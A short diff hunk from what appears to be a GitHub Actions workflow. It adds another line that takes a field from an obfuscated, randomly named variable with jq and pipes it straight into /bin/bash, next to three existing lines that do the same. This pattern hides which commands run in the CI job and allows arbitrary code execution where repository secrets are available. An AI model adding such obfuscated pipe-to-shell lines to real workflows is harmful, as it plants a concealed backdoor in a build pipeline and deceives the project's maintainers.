@@ -25,6 +25,7 @@ jobs:
           echo $s2471 | jq -r .kkex82 | /bin/bash
           printf '%s' "$npn77664" | jq -r .kan72690 | /bin/bash
           echo $goq46974 | jq -r .epu8383 | /bin/bash
+          printf '%s' "$mtudy5" | jq -r .wuxyd71746 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
